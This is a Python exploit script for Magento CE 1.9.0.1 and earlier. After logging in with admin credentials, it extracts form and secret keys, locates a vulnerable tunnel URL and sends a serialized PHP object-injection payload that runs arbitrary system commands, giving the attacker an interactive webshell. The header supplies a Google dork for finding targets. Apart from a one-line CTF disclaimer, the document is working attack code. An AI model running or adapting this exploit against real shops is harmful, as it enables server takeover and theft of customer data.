#!/usr/bin/python3
# Exploit Title: Magento CE < 1.9.0.1 Post Auth RCE 
# Google Dork: "Powered by Magento"
# Date: 14-JUL-2021
# Exploit Author: 0xBruno (but took a lot of inspiration and code snippets from https://www.exploit-db.com/exploits/37811)
# Vendor Homepage: http://magento.com/
# Software Link: https://www.magentocommerce.com/download
# Version: 1.9.0.1 and below
# Tested on: Kali Linux 2021.2
# Note: This is a remake of 37811 exploit in exploitDB.
# https://www.exploit-db.com/exploits/37811
# This exploit script is for CTF use only! Do not attack targets you are not authorized to attack.
# I am not responsible for the misuse of this script.

# IMPORTANT!: Change the username in password in the config section of this script
from hashlib import md5
import sys
import re
import base64
import requests
from bs4 import BeautifulSoup


# Config.
username = 'forme'
password = 'forme'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = bytes('Wed, 08 May 2019 07:23:09 +0000', 'utf-8')  # This needs to be the exact date from /app/etc/local.xml

# If you want to proxy traffic comment out empty proxies dict and uncomment the other
proxies = {}
# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}




def get_formkey(target):
    # 1. GET request to login page  to get hidden form_key
    resp = requests.get(url=target, proxies=proxies)
    
    soup = BeautifulSoup(resp.text, 'html.parser')

    try: 
        form_key = soup.find('input').get('value')
    except AttributeError:
        print('ERROR: URL provided seems invalid.')
    
    print(f'[*] Getting form_key... {form_key}')
    return form_key

def login(target, username, password, form_key):
    # 2. Login by sending POST data to target
    # which will redirect to /admin/index/index/key/<KEY>
    session = requests.Session()
    data = {
        'form_key': form_key,
        'login[username]': username,
        'login[password]': password
    }
    resp = session.post(url=target, data=data, allow_redirects=False, proxies=proxies)
    
    try: 
        redirect_url = resp.headers['Location']
    except KeyError:
        print('ERROR: Provided URL is incorrect. Need the URL for the admin login page.')
        sys.exit()

    key_regex = re.compile('[0-9a-zA-Z]{32}')
    key = re.findall(key_regex, redirect_url)[0]
    print(f'[*] Logging in as {username}:{password}')
    print(f'[*] Finding secret key... {key}')
    return key, session

def dashboard(target, session, secret_key):
    # 3. GET to admin dashboard to get new FORM_KEY and ajaxBlockUrl
    print(f'[*] Navigating to dashboard...')
    dashboard_url = target + f'/dashboard/index/key/{secret_key}/'
    resp = session.get(url=dashboard_url, proxies=proxies)

    ajax_url = re.search("ajaxBlockUrl = \'(.*)\'", resp.text).group(1)
    new_form_key = re.search("var FORM_KEY = '(.*)'", resp.text).group(1)

    print(f'[*] Getting ajaxBlockUrl... {ajax_url}')
    print(f'[*] Getting new FORM_KEY... {new_form_key}')
    # Remove unneeded GET param
    ajax_url = ajax_url.split('/?')[0]
    return ajax_url, new_form_key


def tunnel(url, form_key, session):
    # 4. Get "tunnel URL " (URL that is vulnerable to PHP obj injection)
    periods = ['24h', '7d', '1m', '1y', '2y']
    keep_looping = True
    while keep_looping:
        for period in periods:

            try:
                period_url = url + f'block/tab_orders/period/{period}?isAjax=true'
                data={'isAjax':'false', 'form_key' : form_key}

                resp = session.get(url=period_url, data=data, proxies=proxies)
                
                tunnel = re.search("src=\"(.*)\?ga=", resp.text).group(1)

                if tunnel:
                    keep_looping = False
        
            except AttributeError:
                print(f'[*] Period {period} did not work... ')

    print(f'[*] Getting tunnel URL... {tunnel}')
    tunnel = bytes(tunnel, 'utf-8')

    
    return tunnel

def exploit(tunnel, session):

    print('\n\nHappy Hacking!')
    print('WARNING: This webshell thingy is reallyyyyy slow. Highly recommend getting a reverse shell.')
    while True: 
        try:
            cmd = input('$ ')
            # POP chain to pivot into call_user_exec
            # Taken from https://www.exploit-db.com/exploits/37811
            payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
                '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
                'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
                'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
                '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
                ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function, len(cmd), cmd)
            payload = base64.b64encode(bytes(payload, 'utf-8'))
            
            gh = md5(payload + install_date).hexdigest()

            exploit = tunnel + b'?ga=' + payload + b'&h=' + bytes(gh, 'utf-8')

            exploit_resp = session.get(url=exploit, proxies=proxies)
            print(exploit_resp.text)
        except KeyboardInterrupt:
            print('\n\nUser terminated program...')
            sys.exit()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f'Usage: python3 exploit.py <TARGET>')
        print(f'Example: python3 exploit.py http://localhost/admin/login')
        sys.exit()

    target = sys.argv[1].strip("/")

    form_key = get_formkey(target)

    secret_key, session = login(target, username, password, form_key)

    ajaxURL, new_form_key = dashboard(target, session, secret_key)

    tun = tunnel(ajaxURL, new_form_key, session)

    exploit(tun, session)
